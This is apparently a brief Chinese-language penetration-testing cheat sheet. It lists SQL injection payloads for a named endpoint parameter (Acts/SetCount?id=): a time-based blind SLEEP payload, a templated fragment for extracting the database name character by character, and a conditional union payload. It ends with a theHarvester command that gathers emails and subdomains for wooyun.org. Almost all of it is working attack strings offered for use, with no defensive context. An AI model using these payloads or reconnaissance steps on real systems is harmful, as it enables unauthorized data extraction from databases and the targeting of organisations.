## sql注入
### 注入点    Acts/SetCount?id=63200
```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))RING) and 'RING'='RING
```

```sql
(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))RING)
```

```sql
' and if((1=2),1,(select 1 union select 2))#
```

## 信息收集
### The harvester   搜索引擎查找邮箱及子域名
```shell
./theHarvester.py -d wooyun.org -l 500 -b baidu -v 
```
    theharvester -d 域名|公司名 -b 搜索来源（google，bing，pgp，linkedin等） 
